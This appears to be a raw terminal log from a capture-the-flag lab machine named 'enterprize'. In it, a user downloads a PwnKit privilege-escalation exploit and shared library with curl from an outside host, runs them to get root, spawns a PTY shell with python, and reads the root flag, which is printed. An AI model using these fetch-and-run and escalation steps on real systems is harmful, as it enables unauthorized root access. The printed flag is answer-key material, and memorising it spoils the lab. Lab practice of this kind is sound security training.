+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ lsidrm -rfv exploit pwnkit[C[C[C[C[C[Cls[K[27@cat /tmp/pwnkit/gconv-module[C[C[C[C[C[C[Cls /tmp/pwnkit/gconv-modules /tmp/pwnkit/pwnkit.so[C[C[C[C[C[C./exploit[K[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[C[34@url -o exploit http://192.168.131.92:8008/[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/exploit
+[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0  761k    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0  761k    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0  761k    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0  761k    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 10  761k   10 80032    0     0  58332      0  0:00:13  0:00:01  0:00:12 58374[K 10  761k   10 80032    0     0  58332      0  0:00:13  0:00:01  0:00:12 58374[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0  761k    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 10  761k   10 80032    0     0  58332      0  0:00:13  0:00:01  0:00:12 58374 39  761k   39  297k    0     0   114k      0  0:00:06  0:00:02  0:00:04  114k[K 39  761k   39  297k    0     0   114k      0  0:00:06  0:00:02  0:00:04  114k[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0  761k    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 10  761k   10 80032    0     0  58332      0  0:00:13  0:00:01  0:00:12 58374 39  761k   39  297k    0     0   114k      0  0:00:06  0:00:02  0:00:04  114k[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0  761k    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 10  761k   10 80032    0     0  58332      0  0:00:13  0:00:01  0:00:12 58374 39  761k   39  297k    0     0   114k      0  0:00:06  0:00:02  0:00:04  114k 70  761k   70  536k    0     0   152k      0  0:00:04  0:00:03  0:00:01  152k[K 70  761k   70  536k    0     0   152k      0  0:00:04  0:00:03  0:00:01  152k[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0  761k    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 10  761k   10 80032    0     0  58332      0  0:00:13  0:00:01  0:00:12 58374 39  761k   39  297k    0     0   114k      0  0:00:06  0:00:02  0:00:04  114k 70  761k   70  536k    0     0   152k      0  0:00:04  0:00:03  0:00:01  152k100  761k  100  761k    0     0   186k      0  0:00:04  0:00:04 --:--:--  186k
+john$ [Kjohn$ [K[?2004hjohn$ curl -o exploit http://192.168.131.92:8008/exploit[K[K[K[K[K[K[Kpwnkit.so[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/pwnkit.so
+[Kcurl -o exploit http://192.168.131.92:8008/pwnkit.so
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 80 15720   80 12643    0     0  13238      0  0:00:01 --:--:--  0:00:01 13224100 15720  100 15720    0     0  16323      0 --:--:-- --:--:-- --:--:-- 16307
+john$ [Kjohn$ [K[?2004hjohn$ chmod_[K +x exploit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x exploit
+[Kchmod +x exploit[Kchmod +x exploit[Kchmod +x exploit
+john$ [Kjohn$ [K[?2004hjohn$ ./exploit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h./exploit
+[K./exploit
+bash: [4899: 1 (255)] tcsetattr: Inappropriate ioctl for device
+john$ [Kjohn$ [K[?2004hjohn$ id[?2004l[C[C[C[C[C[C[K[?2004hid
+[Kid
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),30(dip),46(plugdev),1001(blocked)
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls
+exploit
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ rm -rfv r[Kexploit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rfv exploit
+[Krm -rfv exploit[Krm -rfv exploit[Krm -rfv exploit
+removed 'exploit'
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -o exploit http://192.168.131.92:8008/exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/exploit
+[Kcurl -o exploit http://192.168.131.92:8008/exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  1  761k    1 12404    0     0  13309      0  0:00:58 --:--:--  0:00:58 13294[K  1  761k    1 12404    0     0  13309      0  0:00:58 --:--:--  0:00:58 13294[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  1  761k    1 12404    0     0  13309      0  0:00:58 --:--:--  0:00:58 13294 16  761k   16  124k    0     0  68476      0  0:00:11  0:00:01  0:00:10 68439 54  761k   54  411k    0     0   151k      0  0:00:05  0:00:02  0:00:03  151k[K 54  761k   54  411k    0     0   151k      0  0:00:05  0:00:02  0:00:03  151k[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  1  761k    1 12404    0     0  13309      0  0:00:58 --:--:--  0:00:58 13294 16  761k   16  124k    0     0  68476      0  0:00:11  0:00:01  0:00:10 68439 54  761k   54  411k    0     0   151k      0  0:00:05  0:00:02  0:00:03  151k100  761k  100  761k    0     0   225k      0  0:00:03  0:00:03 --:--:--  225k
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -o exploit http://192.168.131.92:8008/pwnkit.so[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/pwnkit.so
+[Kcurl -o exploit http://192.168.131.92:8008/pwnkit.so[Kcurl -o exploit http://192.168.131.92:8008/pwnkit.so[Kcurl -o exploit http://192.168.131.92:8008/pwnkit.so
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0 15720    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K  0 15720    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0 15720    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0100 15720  100 15720    0     0   9504      0  0:00:01  0:00:01 --:--:--  9498
+john$ [Kjohn$ [K[?2004hjohn$ curl -o exploit http://192.168.131.92:8008/pwnkit.so[2Pexploit[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rfv exploit
+[Krm -rfv exploit[Krm -rfv exploit[Krm -rfv exploit
+removed 'exploit'
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -o exploit http://192.168.131.92:8008/exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/exploit
+[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  2  761k    2 16376    0     0  17665      0  0:00:44 --:--:--  0:00:44 17646[K  2  761k    2 16376    0     0  17665      0  0:00:44 --:--:--  0:00:44 17646[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  2  761k    2 16376    0     0  17665      0  0:00:44 --:--:--  0:00:44 17646 23  761k   23  175k    0     0  95719      0  0:00:08  0:00:01  0:00:07 95668[K 23  761k   23  175k    0     0  95719      0  0:00:08  0:00:01  0:00:07 95668[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  2  761k    2 16376    0     0  17665      0  0:00:44 --:--:--  0:00:44 17646 23  761k   23  175k    0     0  95719      0  0:00:08  0:00:01  0:00:07 95668[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  2  761k    2 16376    0     0  17665      0  0:00:44 --:--:--  0:00:44 17646 23  761k   23  175k    0     0  95719      0  0:00:08  0:00:01  0:00:07 95668 48  761k   48  366k    0     0   127k      0  0:00:05  0:00:02  0:00:03  127k[K 48  761k   48  366k    0     0   127k      0  0:00:05  0:00:02  0:00:03  127k[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  2  761k    2 16376    0     0  17665      0  0:00:44 --:--:--  0:00:44 17646 23  761k   23  175k    0     0  95719      0  0:00:08  0:00:01  0:00:07 95668 48  761k   48  366k    0     0   127k      0  0:00:05  0:00:02  0:00:03  127k[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  2  761k    2 16376    0     0  17665      0  0:00:44 --:--:--  0:00:44 17646 23  761k   23  175k    0     0  95719      0  0:00:08  0:00:01  0:00:07 95668 48  761k   48  366k    0     0   127k      0  0:00:05  0:00:02  0:00:03  127k100  761k  100  761k    0     0   200k      0  0:00:03  0:00:03 --:--:--  200k
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -o pwnkit.so http://192.168.131.92:8008/pwnkit.so[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o pwnkit.so http://192.168.131.92:8008/pwnkit.so
+[Kcurl -o pwnkit.so http://192.168.131.92:8008/pwnkit.so[Kcurl -o pwnkit.so http://192.168.131.92:8008/pwnkit.so[Kcurl -o pwnkit.so http://192.168.131.92:8008/pwnkit.so
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100 15720  100 15720    0     0  20932      0 --:--:-- --:--:-- --:--:-- 20932
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+exploit
+pwnkit.so
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ [7mchmod +x exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x exploit
+[Kchmod +x exploit[Kchmod +x exploit[Kchmod +x exploit
+john$ [Kjohn$ [K[?2004hjohn$ [7m./exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h./exploit
+[K./exploit[K./exploit[K./exploit
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=0(root) gid=0(root) groups=0(root)
+[K[K[?2004hwhich python[?2004l[K[?2004hwhich python
+[K[K[?2004hpython3 --version[?2004l[K[?2004hpython3 --version
+[K[K[?2004hc[K[?2004lPython 3.6.9
+[K[?2004hcd [K[K[K[7mpython3 -c 'import pty; pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython3 -c 'import pty; pty.spawn("/bin/bash")'
+[Kroot@enterprize:/tmp# [Kroot@enterprize:/tmp# [K[?2004hroot@enterprize:/tmp# cd /root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /root
+[Kcd /root
+[Kroot@enterprize:/root# [Kroot@enterprize:/root# [K[?2004hroot@enterprize:/root# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kroot.txt
+root@enterprize:/root# [Kroot@enterprize:/root# [K[?2004hroot@enterprize:/root# cat root.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat root.txt
+[Kcat root.txt
+[KTHM{568a171c9460d2b3871618b9d5232919}
+root@enterprize:/root# [Kroot@enterprize:/root# [K[?2004hroot@enterprize:/root# echo ""t"h"e" "w"[1P"m"o"s"t" "d"i"f"f"i"c"u"l"t" "r"o"o"m" "e"v"e"r" "[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho "the most difficult room ever "
+[Kecho "the most difficult room ever "
+[Kthe most difficult room ever 
+root@enterprize:/root# [Kroot@enterprize:/root# [K[?2004hroot@enterprize:/root# cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home
+[Kroot@enterprize:/home# [Kroot@enterprize:/home# [K[?2004hroot@enterprize:/home# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kjohn
+root@enterprize:/home# [Kroot@enterprize:/home# 
+[?2004l
+Script done on 2026-09-27 06:34:15+03:00 [COMMAND_EXIT_CODE="1"]
